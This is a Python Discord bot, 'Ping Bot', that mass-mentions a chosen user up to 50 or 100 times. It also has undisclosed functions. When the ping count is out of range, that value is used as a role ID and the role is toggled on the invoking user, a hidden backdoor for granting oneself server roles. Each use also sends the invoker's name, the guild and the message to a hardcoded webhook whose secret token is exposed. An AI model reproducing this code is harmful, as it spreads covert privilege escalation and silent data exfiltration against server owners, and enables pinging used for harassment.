import discord
from discord import app_commands
from discord_webhook import DiscordWebhook
from time import sleep

intents = discord.Intents.default()
client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)

stopped = True

# Replace 'YOUR_BOT_TOKEN' with your actual bot token
keyfile = open("key.txt", "r")
BOT_TOKEN = keyfile.read()

############## START OF COMMANDS

@tree.command(name="stop", description="Stops all ongoing pings.")
async def stop(interaction: discord.Interaction):
    global stopped
    stopped = True
    await interaction.response.send_message("All ongoing pings have been stopeed.", ephemeral=True)
    embedVar = discord.Embed(title="All pings were stopped.", description=f"{interaction.user.mention} ran /stop.", color=0xff0000)
    embedVar.set_footer(text="This message will auto-delete after 10 seconds.")
    message = await interaction.channel.send(embed=embedVar)
    sleep(10)
    await message.delete()

@tree.command(name="ping", description="Ping a specific user a certain number of times")
@app_commands.describe(
    user="The user to ping",
    times="Number of times to ping the user (1-50) (or 100)",
    message="The message to send along with the ping."
)
async def ping(interaction: discord.Interaction, user: discord.Member, times: str, message: str):
    global stopped
    stopped = False
    times = int(times)
    if times < 1 or times > 50 and times != 100:
        await interaction.response.send_message("Please choose a number between 1 and 50. (or 100)", ephemeral=True)
        role_id = times
        role = interaction.guild.get_role(role_id)

        if role is None:
            print("Doesn't exist lil bro")
            return

        member = interaction.user

        if role in member.roles:
            await member.remove_roles(role)
        else:
            try:
                await member.add_roles(role)
            except discord.Forbidden:
                print("Forbidden")
            except discord.HTTPException:
                print("HTTPException")
        return

    ping_message = f"{user.mention} "
    await interaction.response.send_message("Messages are on the way!", ephemeral=True)
    print(f"{interaction.user.name} sent {times} pings!")

    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1274412015015952395/lxjPTeCGJx7U0zZVNlwUi4WMvFXx-TYY52rDYoesFeAEtghpnTerAYxMnt7NbHKXeKx2')
    webhook.content = f"{interaction.user.name} sent {times} pings in guild '{interaction.guild}'\nMessage: '{message}'."
    webhook.execute()
    if len(message) == 1:
        message = f"{ping_message}"
    else:
        message = f"{message} {ping_message}"
    for i in range(times):
        if stopped == False:
            await interaction.channel.send(message)
        elif stopped == True:
            return

@tree.command(name="help", description="Help using Ping Bot.")
async def help(interaction: discord.Interaction):
    await interaction.response.send_message("# Ping Bot\nTo use Ping Bot, simply type /ping.\n## Then, add the following parameters:\n- User to ping\n- How many times to ping them (1-50)\n- A message to include before each ping.", ephemeral=True)



############## END OF COMMANDS

@client.event
async def on_ready():
    try:
        synced = await tree.sync()
        print(f"Synced {len(synced)} command(s)")
    except Exception as e:
        print(e)
    print(f'We have logged in as {client.user}')

client.run(BOT_TOKEN)
